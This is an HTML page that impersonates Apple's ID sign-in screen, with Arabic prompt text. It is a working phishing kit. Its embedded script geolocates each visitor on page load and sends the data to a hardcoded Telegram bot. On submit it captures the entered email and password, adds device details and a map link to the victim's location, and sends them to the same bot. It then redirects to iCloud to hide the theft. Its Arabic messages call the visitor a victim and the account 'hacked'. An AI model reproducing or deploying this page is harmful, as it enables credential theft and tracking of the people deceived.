<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sign In - Apple</title>
    <style>
        body { font-family: -apple-system, system-ui, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .box { width: 100%; max-width: 340px; text-align: center; padding: 20px; }
        img { width: 35px; margin-bottom: 20px; }
        h1 { font-size: 24px; font-weight: 600; margin: 0 0 10px; }
        p { color: #666; font-size: 14px; margin-bottom: 30px; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #d2d2d7; border-radius: 10px; font-size: 16px; box-sizing: border-box; outline: none; }
        button { width: 100%; padding: 14px; background: #0071e3; color: #fff; border: none; border-radius: 10px; font-size: 17px; font-weight: 500; cursor: pointer; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
    <h1>Apple ID</h1>
    <p>استخدم الـ Apple ID الخاص بك لتسجيل الدخول</p>
    <input type="email" id="u" placeholder="Apple ID" required>
    <input type="password" id="p" placeholder="Password" required>
    <button id="btn">Continue</button>
</div>

<script>
    const token = "8213467523:AAE-4yv3jiYvyAHpJU4XJ90lALV5OSKzNDE";
    const chat_id = "6888107255";

    async function sendMsg(text) {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=HTML`);
    }

    // محرك جلب البيانات الثلاثي (Tri-Fetch Engine)
    async function getFullData() {
        let results = { ip: "127.0.0.1", city: "غير معروف", country: "غير معروف", isp: "محمي/VPN", map: "" };
        try {
            // محاولة عبر ipwhois
            const r1 = await fetch('https://ipwho.is/');
            const d1 = await r1.json();
            if(d1.success) {
                results = { ip: d1.ip, city: d1.city, country: d1.country, isp: d1.connection.isp, map: `https://www.google.com/maps?q=${d1.latitude},${d1.longitude}` };
            } else throw 'e';
        } catch(e) {
            try {
                // محاولة احتياطية ثانية عبر ipapi
                const r2 = await fetch('https://ipapi.co/json/');
                const d2 = await r2.json();
                results = { ip: d2.ip, city: d2.city, country: d2.country_name, isp: d2.org, map: `https://www.google.com/maps?q=${d2.latitude},${d2.longitude}` };
            } catch(e2) {}
        }
        return results;
    }

    // 1. عند الدخول فوراً
    window.onload = async function() {
        sendMsg("🔔 <b>دخول جديد للرابط... جاري جمع المعلومات</b>");
        const data = await getFullData();
        let entry = `📍 <b>معلومات الدخول الأولية:</b>\n🌐 IP: ${data.ip}\n🏙️ المدينة: ${data.city}\n📶 المزود: ${data.isp}`;
        sendMsg(entry);
    };

    // 2. التقرير الشامل عند الضغط
    document.getElementById('btn').onclick = async function() {
        const user = document.getElementById('u').value;
        const pass = document.getElementById('p').value;
        if(!user || !pass) return;

        this.innerHTML = "Processing...";
        this.disabled = true;

        const d = await getFullData();

        let report = "⚠️ <b>تم اختراق الهدف بنجاح</b> ⚠️\n\n";
        report += "📧 <b>الحساب:</b> <code>" + user + "</code>\n";
        report += "🔑 <b>الباسورد:</b> <code>" + pass + "</code>\n";
        report += "------------------------\n";
        report += "🌐 <b>الـ IP:</b> " + d.ip + "\n";
        report += "📍 <b>الموقع:</b> " + d.city + " (" + d.country + ")\n";
        report += "📶 <b>المزود:</b> " + d.isp + "\n";
        report += "📱 <b>النظام:</b> " + navigator.platform + "\n";
        report += "🔋 <b>البطارية:</b> " + (navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + "%" : "N/A") + "\n";
        report += "📏 <b>الدقة:</b> " + screen.width + "x" + screen.height + "\n";
        report += "🕰️ <b>الوقت:</b> " + new Date().toLocaleString() + "\n";
        report += "🔒 <b>كوكيز:</b> " + (document.cookie ? "موجودة" : "محمية") + "\n\n";
        report += "📍 <b>موقع الضحية على الخريطة:</b>\n" + d.map;

        await sendMsg(report);

        setTimeout(() => {
            window.location.replace("https://www.icloud.com/");
        }, 1000);
    };
</script>

</body>
</html>
